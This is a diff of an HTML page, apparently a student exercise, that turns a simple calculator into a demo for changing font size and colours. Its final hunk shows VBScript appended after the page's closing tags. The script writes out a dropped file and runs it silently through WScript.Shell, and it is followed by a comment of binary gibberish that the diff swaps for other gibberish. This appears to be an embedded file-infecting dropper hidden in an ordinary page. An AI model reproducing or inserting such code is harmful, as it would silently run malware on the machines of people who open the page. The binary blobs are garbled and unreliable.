@@ -1,286 +1,122 @@
 <html>
 	<head>
-  <title>Calculator</title>
+  <title>Dom</title>
   <meta charset="UTF-8" />
 	
 	<style>
-		body{
-			background:grey;
-		}
 		#container{
-			width:500px;
-			height:600px;
-			margin-left: 420px;
-			margin-top: 50px;
+			width:100%;
+			height: 300px;
 		}
 		#content{
-			width:300px;
-			height:45%;
-			text-align:center;
+			width:80%;
+			height:auto;
 			margin: 0 auto;
-			background-color: red;
-			border-radius: 12px;
-		}
-		#text{
-			width:266px;
-			height:50px;
-			margin-top: 20px;
+			text-align:center;
 		}
 		.nut{
-			width:50px;
-			height:auto;
-			border-radius:5px;
-			background-color:#4FAA50;
-			 -webkit-transition-duration: 0.4s; /* Safari */
-			transition-duration: 0.4s;
-			cursor: pointer;
-		}
-		#range1 {
-			float: left;
-			margin-left: 17px;
-		}
-		#range2{
-			float:left;
-		    margin-left: 17px
-		}
-		.nutbang{
-			    height: 47px;
-				width: 50px;
-				margin-left: -12px;
-				border-radius:5px;
-		}
-		.nutkhong{
-			width:104px;
-			border-radius:5px;
-		}
-		.nutkhong:hover{
-			opacity:0.7;
 			background-color:red;
-			transform: translate(0,-2px);
-			box-shadow: 5px 5px 5px 0px rgba(0,0,0,1);
-		}
-		.hang{
-			margin-top:5px;
-			margin-left:5px;
-			margin-right:5px;
-			margin-bottom:0px;
-		}
-		marquee{
-			text-align:center;
-			margin-left: 120px;
-		}
-		.nut:hover {
-			opacity:0.7;
-			background-color:red;
-			transform: translate(0,-2px);
-			box-shadow: 5px 5px 5px 0px rgba(0,0,0,1);
 		}
 	</style>
 </head>
+
 <body>
 	<script language="JavaScript">
-	var so1='';
-	var so2='';
-	var flag=1;
-	var pheptinh;
-	function nhapso(id)
-			{
-				if(flag==1)
-					{
-						var tam=document.getElementById(id).value;
-						//hi·ªÉn thi l√™n m√†n h√¨nh
-						document.getElementById("text").value+=tam;
-						//luu vao s·ªë 1
-						so1+=tam;
-					}
-				else if(flag==2)
-					{
-						var tam2=document.getElementById(id).value;
-						document.getElementById("text").value+=tam2;
-						so2+=tam2;
-						
-					}
-			}
-			function nhappheptinh(id)
+		
+		function changeFontSize(x)
+		{
+			var element=document.getElementsByClassName('p1');
+			for(var i=0;i<element.length;i++)
 				{
-					flag=2;
-					var _pheptinh=document.getElementById(id);
-					document.getElementById("text").value+=_pheptinh.value;
-					pheptinh=_pheptinh.value;
-				}
-			function ketqua()
-				{
-					//var kq=document.getElementById('text');
-					so1=parseFloat(so1);
-					so2=parseFloat(so2);
-					var ketqua = so1;
-					switch(pheptinh)
-						{
-							case '+':
-								{
-									ketqua=so1 +so2;
-									//kq.value=parseFloat(so1)+parseFloat(so2);
-									break;
-								}
-							case '-':
-								{
-									ketqua=so1 - so2;
-									//kq.value=parseFloat(so1)-parseFloat(so2);
-									break;
-								}
-							case '*':
-								{
-									ketqua=so1 * so2;
-									//kq.value=parseFloat(so1) * parseFloat(so2);
-									break;
-								}
-							case '/':
-								{
-									ketqua=so1 / so2;
-									//kq.value=parseFloat(so1)/parseFloat(so2);
-									break;
-								}
-							case '^':
-								{
-									ketqua = Math.pow(so1,so2);
-									break;
-								}
-							
-						}
-						var hienthi=document.getElementById('text');
-						hienthi.value=ketqua;
-					so1 =ketqua;
-					so2=0;
-					flag=1;				
+					element[i].style.fontSize=x;
 				}
 			
-			function Clear()
-				{
-					document.getElementById('text').value='';
-					flag=1;
-					so1=0;
-					so2=0;
-				}
-			function chiaX()
-				{
-					var hienthi=document.getElementById('text');
-					hienthi.value = Math.round(1/so1*1000)/1000; //l√†m tr√≤n s·ªë sau d·∫•u ph·∫©y l√† 3 s·ªë
-					so1=hienthi.value;
-					
-				}
-			function SinX()
-				{
-					var hienthi = document.getElementById('text');
-					hienthi.value = Math.sin(Math.PI*so1/180);
-					so1=hienthi.value;
-				}
-			function CosX()
-				{
-					var result = document.getElementById('text');
-					result.value = Math.cos(Math.PI * so1/180);
-					so1 = result.value;
-				}
-			function nhandoi(so)
-				{
-					return so*so;
-				}
-			function BinhPhuong()
-				{
-					var kq = document.getElementById('text');
-					kq.value = nhandoi(so1);
-					so1 = kq.value;
-				}
-					
-			function GiaithuaN()
-				{
-					
-					var tg=1;
-					var tam = document.getElementById('text');
-					for(var i=1 ; i<=so1; i++)
-						{
-							tg = tg*i;
-						}
-					tam.value=tg;
-					so1=tg;		// g√°n cho s·ªë 1 l√† giai th·ª´a ƒë·ªÉ n·∫øu nh·∫•n ph√©p t√≠nh th√¨ s·∫Ω l∆∞u lu√¥n giai th·ª´a l√† s·ªë1
-
-				}
-			function CanBacHai()
-				{
-					var ketqua = document.getElementById('text');
-					ketqua.value = Math.sqrt(so1);
-					so1 = ketqua.value;
-				}
-			function SoPI()
-				{
-					var ketqua = document.getElementById('text');
-					ketqua.value = Math.PI;
-					so1 = ketqua.value;
-				}
-			function congtru()
+		}
+		function increaseFontSize(vitri)
 			{
-				var ketqua = document.getElementById('text');
+				var element=document.getElementsByClassName('p1')[vitri];
+				x = window.getComputedStyle(element,null).getPropertyValue('font-size');// GET computer fontsize propertype
+				var font = parseFloat(x);
+				if(font<30)
+				{
+					element.style.fontSize = (font + 10) + 'px';
+				}
+				else
+				{
+					alert("Font co kich thuoc >30px");
+				}
+			}
+		function decreaseFontSize1(vitri)
+			{
+				var element=document.getElementsByClassName('p1')[vitri];
+				var	x = window.getComputedStyle(element,null).getPropertyValue('font-size');
+				var font=parseFloat(x);
+				if(font >10)
+					{
+						element.style.fontSize = (font -10) +'px';
+					}
+				else
+					{
+						alert("Font co kich thuoc <10px khong giam duoc");
+					}
+			}
+		function changeColor()
+			{
+				var element=document.getElementsByClassName('p1');
+				element[0].style.color="green";
+				element[1].style.color= "yellow";
+				element[2].style.color = "red";
+			}
+		function changeBgColor(color)
+			{
 				
-				so1 = parseFloat(-so1);						//G√°n s·ªë √¢m cho s·ªë 1
-				ketqua.value=so1;			
+				 document.body.style.backgroundColor = color;
 			}
-			function TanX()
-			{
-				var result = document.getElementById('text');
-					result.value = Math.tan(Math.PI * so1/180);
-					so1 = result.value;
-					
-			}
+		function copyContent(vitri1,vitri2)						
+		{
+			var el = document.getElementsByClassName('p1');
+			el[vitri1].innerHTML = el[vitri2].innerHTML;
+		}
+	
 
+		
 	</script>
+	<p class="p1">
+		What is Lorem Ipsum?<br>
+			Lorem Ipsum is simply dummy text of the printing and typesetting industry. 
+			Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, 
+			when an unknown printer took a galley of type and scrambled it to make a type specimen book. 
+			It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. 
+			It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
+	</p>
+	<p class="p1">
+		Why do we use it?<br>
+			It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. 
+			The point of using Lorem Ipsum is that it has a more-or-less normal distribution of letters, 
+			as opposed to using 'Content here, content here', making it look like readable English. 
+			Many desktop publishing packages and web page editors now use Lorem Ipsum as their default model text, and a search for 'lorem ipsum' will uncover many web sites still in their infancy. 
+			Various versions have evolved over the years, sometimes by accident, sometimes on purpose (injected humour and the like).
+	</p>
+	<p class="p1">
+		Where can I get some?<br>
+			There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected humour, or randomised words which don't look even slightly believable. 
+			If you are going to use a passage of Lorem Ipsum, you need to be sure there isn't anything embarrassing hidden in the middle of text. All the Lorem Ipsum generators on the Internet tend to repeat predefined chunks as necessary, making this the first true generator on the Internet. It uses a dictionary of over 200 Latin words, 
+			combined with a handful of model sentence structures, to generate Lorem Ipsum which looks reasonable. 
+			The generated Lorem Ipsum is therefore always free from repetition, injected humour, or non-characteristic words etc.
+	</p>
 	<form>
 		<div id="container">
-			<marquee width="50%"><h3>CH∆Ø∆†NG TR√åNH M√ÅY T√çNH ƒê∆†N GI·∫¢N</h3></marquee>
 			<div id="content">
-				<input id="text"type="text" id= "text"value=""><br/><br/>
-				<div class="hang">
-					<button class="nut" type="button" id="binhphuong" value="binhphuong" onclick="BinhPhuong()">x&sup2; </button>
-					<button class="nut"type="button" id="giaithua" value="giaithua" onclick="GiaithuaN()">n!</button>
-					<button class="nut"type="button" id="canbac2" value="canb" onclick="CanBacHai()" >x&frac12;</button>
-					<button class="nut"type="button" id="^" value="^" onclick = "nhappheptinh('^')">n&ordf;</button>
-					<button class="nut"type="button" id="PI" value="PI" onclick = "SoPI()">&pi;</button>
-				</div>
-				<div class="hang">
-					<button class="nut"type="button" id="C" value="C" onclick="Clear()" >C</button>				
-					<button class="nut"type="button" id="duong" value="duong" onclick="congtru()">-/+</button>
-					<button class="nut" type="button" id="tan" value="tan" onclick="TanX()">Tan</button>
-					<button class="nut"type="button" id="cos" value="cos" onclick="CosX()" >Cos</button>	
-					<button class="nut"type="button" id="sin" value="sin" onclick="SinX()">Sin</button>
-				</div>
-				<div class="hang">
-					<button class="nut" type="button" id="7" value="7" onclick="nhapso(7)">7</button>
-					<button class="nut" type="button" id="8" value="8" onclick="nhapso(8)">8</button>
-					<button class="nut" type="button" id="9" value="9" onclick="nhapso(9)">9</button>
-					<button class="nut" type="button" id="/" value="/" onclick="nhappheptinh('/')">/</button>	
-					<button class="nut" type="button" id="%" value="%" onclick="nhappheptinh('%')">%</button>	
-				</div>
-				<div class="hang">
-					<button class="nut" type="button" id="4" value="4" onclick="nhapso(4)">4</button>
-					<button class="nut" type="button" id="5" value="5" onclick="nhapso(5)">5</button>
-					<button class="nut" type="button" id="6" value="6" onclick="nhapso(6)">6</button>
-					<button class="nut" type="button" id="*" value="*" onclick="nhappheptinh('*')">*</button>
-					<button class="nut" type="button" id="chia" value="chia" onclick="chiaX()">1/x</button>					
-				</div>
-				<div class="hang"id="range1">				
-					<button class="nut"type="button" id="1" value="1" onclick="nhapso(1)">1</button>
-					<button class="nut"type="button" id="2" value="2" onclick="nhapso(2)">2</button>
-					<button class="nut"type="button" id="3" value="3" onclick="nhapso(3)">3</button>
-					<button class="nut"type="button" id="-" value="-" onclick="nhappheptinh('-')">-</button>
-				</div>	
-				<div class="hang"id="range2">				
-					<button class="nutkhong" type="button" id="0" value="0"onclick="nhapso(0)">0</button>
-					<button class="nut" type="button" id="11" value="." onclick="nhapso(11)">.</button>
-					<button class="nut" type="button" id="+" value="+"onclick="nhappheptinh('+')">+</button>
-				</div>
-				<div class="hang" id="range3">
-					<button class="nutbang" type="button" id="=" value="=" onclick="ketqua()">=</button>
-				</div>
+				<button class="nut"type="button" onclick="changeFontSize(29)">changeFontSize</button>
+				<button class="nut"type="button" onclick="increaseFontSize(2)">increaseFontSize</button>
+				<button class="nut"type="button" onclick="decreaseFontSize1(1)">increaseFontSize</button>
+				<button class="nut"type="button" onclick="changeColor()">changeColor</button>
+				<button class="nut"type="button" onclick="changeBgColor('blue')">changeBgColor</button>
+				<button class="nut"type="button" onclick="copyContent(0,1)">copyContent</button>
 			</div>
-			</div>		
+		</div>
+		
+		
 	</form>
 	
 </body>
@@ -298,5 +134,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--ÿ¯ì	eû _åz„ ;“i_ö‰›n5 <M/ øA1ÀÍl¬¢IÇÎïÍ¸4B6W4«ØPd¡“éŒ≈*^˙Ô&†!Á;—ﬁ±2Fsc•Øµx`L™ef≤á®ﬁ!Ÿ»l‰¨ãLÏD‹*àë&…|œË√ZÍ†”í!( ê’‚⁄>Ìî¡t]ìywœ›ÕÃx‘®Ehw˜·k;VŸ†èêEoB3ß‚≤BxÔîÜT∂Õ&õu¬CgÅWﬂìêQÛßÙf HH F˚r¿Ùõâ˜-òö|˜√∫—
-4 -ˆê≈WÛwVl6Ûtj9æÍìF˜¨Ìq[X¨}L6tã3ı&èP‹uÎÒ‹fÔÅJw76ö^Ú&Ä|ã∆€˚îJ8âﬁ848≥E¢ j@ÈMØw)§WfÄúŒÉµMMﬂ	√∫#Nw‚ È®R*≥˚È®È®È®è¿‡L¸>5YÕˆ® È®-->
+//--></SCRIPT><!--O%i∏º+Cpázã€#£∂≥4·∂/s•äôºÅÍc>õ˜◊ÍÓ©†Ö8]êØ%!ﬂ{·dîmçP ¶ tôB”⁄r“ÅLYô?C	±]%Œ¸∫‹F©õ1®πóG¥}≈∏Äü¶Ó,N¡4ÈÁè÷}7˚dÈÃπ•é+
+[ÖiÎ`T˜—sû^Ñ«äá(Œ_rù<”9Ãí€ ”ùÖƒè;œ±À»uAù¬«LºuÖ†Ÿ"ÏÖWç	/bC≤Ü†g+yø™√lÍË◊E√Ö a$‡§\¨z•-Eeb-ù√âÓ–î∏ÛD?Ôoc–!Î™…ﬁ0* Åõ©∫l¡∆≠S˚R˘›¯}¯‹[™%ù/rœ›^ŒN†µt}– 57&‚Y§`dVóg[UEƒyñb6+ß≥i°?3†‹z“¯ômﬁY ú+ ∂$∏{9ß5.†.äﬁÿ‚~;2Øâª&∂É ÈR*¯ÈÈÈè¿RO2*ﬁZ
+˚ È-->
